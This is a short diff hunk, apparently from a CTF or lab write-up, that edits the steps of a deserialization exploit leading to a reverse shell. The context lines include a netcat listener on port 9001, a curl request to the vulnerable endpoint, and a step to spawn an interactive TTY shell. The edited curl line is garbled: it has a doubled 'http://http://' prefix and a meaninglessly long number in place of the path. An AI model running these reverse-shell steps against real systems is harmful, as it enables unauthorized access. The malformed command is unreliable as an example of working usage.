@@ -179,7 +179,7 @@ nc -lvnp 9001
 2. Trigger Exploit:
 Pass the serialized string to the vulnerable endpoint via Burp Suite Repeater or curl:
 ```bash
-curl "http://<TARGET_IP>/<HIDDEN_DIRECTORY>/?file=test.php"
+curl "http://http://10.48.155.114/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055?file=test.php"
 ```
 3. Establish Connection:
 Verify connection arrival on the listener and spawn an interactive TTY shell:
